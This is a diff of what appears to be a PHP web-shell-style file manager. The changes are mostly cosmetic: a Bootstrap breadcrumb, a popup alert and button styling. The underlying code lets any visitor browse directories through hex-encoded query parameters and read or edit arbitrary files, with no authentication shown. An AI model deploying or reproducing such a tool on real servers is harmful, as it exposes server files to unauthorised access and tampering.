@@ -34,22 +34,30 @@ function unhex($hex) {
 
 function pwd() {
 	$dir = preg_split("/(\\\|\/)/", getcwd());
-	foreach ($dir as $key => $value) { 
-		if($value=='' && $key==0) {
-			echo '<a href="?v=2f">/</a>';
-		}
-		if($value == '') { 
-			continue;
-		}
-		echo '<a href="?v=';
-		for ($i = 0; $i <= $key; $i++) {
-			echo hex($dir[$i]); 
-			if($i != $key) {
-				echo '2f';
-			}
-		}
-		print('">'.$value.'</a> > '); 
-	}
+	?>
+	<nav aria-label="breadcrumb">
+  		<ol class="breadcrumb">
+  			<?php
+  			foreach ($dir as $key => $value) {
+  				if($value=='' && $key==0) {
+  					echo '<li class="breadcrumb-item"><a href="?v=2f">/</a></li>';
+  				}
+  				if($value == '') { 
+  					continue;
+  				}
+  				echo '<li class="breadcrumb-item"><a href="?v=';
+  				for ($i = 0; $i <= $key; $i++) {
+  					echo hex($dir[$i]); 
+  					if($i != $key) {
+  						echo '2f';
+  					}
+  				}
+  				print('">'.$value.'</a></li>');
+  			}
+  			?>
+		</ol>
+	</nav>
+	<?php
 }
 function text($number) {
 	switch ($number) {
@@ -199,24 +207,58 @@ function geticon($filename) {
         	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg");break;
         default:
         	return ('https://image.flaticon.com/icons/svg/833/833524.svg');break;
-        }
     }
+}
+function alert($msg) {
+	?>
+	<div id="jAlRem">
+    <div id="jAlert">
+        <table id="jAlert_table">
+            <tr id="jAlert_tr">
+                <td id="jAlert_td">  <p id="jAlert_content"></p>  </td>
+                <td id="jAlert_td">  <button id='jAlert_ok'  onclick="jAlertagree()"></button>  </td>
+            </tr>
+        </table>
+    </div>
+</div>
+	<script>
+	function jAlert(text, customokay){
+	document.getElementById('jAlert_content').innerHTML = text;
+    document.getElementById('jAlert_ok').innerHTML = customokay;
+    document.body.style.backgroundColor = "gray";
+    document.body.style.cursor="wait";
+}
+function jAlertagree(){
+    var parent = document.getElementById('jAlRem');
+    var child = document.getElementById('jAlert');
+    parent.removeChild(child);
+    document.body.style.backgroundColor="white";
+    document.body.style.cursor="default";
+}
+jAlert("Stop! Stop!", "<b>Okay!</b>");
+</script>
+	<?php
+}
 function ftime($filename) {
 	return date("d M Y H:i:s", @filemtime($filename));
 }
 function freadd($filename) {
 	return htmlspecialchars(file_get_contents($filename));
 }
+function fredit($filename, $data) {}
 if (isset($_GET['v'])) {
 	$cd = unhex($_GET['v']);
 	@chdir(unhex($_GET['v']));
 }
 ?>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
 <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+</script>
 <style type="text/css">
 	body {
 		overflow: hidden;
@@ -234,7 +276,31 @@ if (isset($_GET['v'])) {
 	.buntel table td {
 		padding-bottom:10px;
 	}
+	.clickable:hover {
+		cursor: pointer;
+	}
+	#jAlert_table, #jAlert_th, #jAlert_td{
+    border: 2px solid blue;
+    background-color:lightblue;
+    border-collapse: collapse;
+    width:100px;
+}
 
+#jAlert_th, #jAlert_td{
+    padding:5px;
+    padding-right:10px;
+    padding-left:10px;
+}
+
+#jAlert{
+    /* Position fixed */
+    position:fixed;
+    /* Center it! */
+    top: 50%;
+    left: 50%;
+    margin-top: -50px;
+    margin-left: -100px;
+}
 </style>
 <script type="text/javascript">
 	jQuery(document).ready(function($) {
@@ -253,6 +319,7 @@ if (isset($_GET['v'])) {
 		@$_GET['file'] = unhex($_GET['file']);
 		switch (@$_GET['a']) {
 			case 'e':
+			print(alert('sad'));
 				?>
 				<div class="buntel">
 				<table class="tablet" width="100%">
@@ -274,7 +341,7 @@ if (isset($_GET['v'])) {
 						</tr>
 						<tr>
 							<td colspan="3">
-								<input type="submit" name="submit">
+								<input class="btn btn-outline-success" type="submit" name="submit" value="Save">
 							</td>
 						</tr>
 					</form>
@@ -282,10 +349,6 @@ if (isset($_GET['v'])) {
 				</div>
 				<?php
 				exit();
-				break;
-			
-			default:
-				# code...
 				break;
 		}
 		?>
@@ -322,7 +385,7 @@ if (isset($_GET['v'])) {
 			<?php }
 			foreach (files(getcwd(), 'file') as $key => $value) { ?>
 				<li class="list-group-item">
-					<div class="row" title='<?= $value['fname'] ?>'>
+					<div class="row" title='<?= $value['fname'] ?>' >
 						<div class="col text-truncate">
 							<img class="icon" src="<?= geticon($value['names']) ?>"> 
 							<?= $value['fname'] ?>
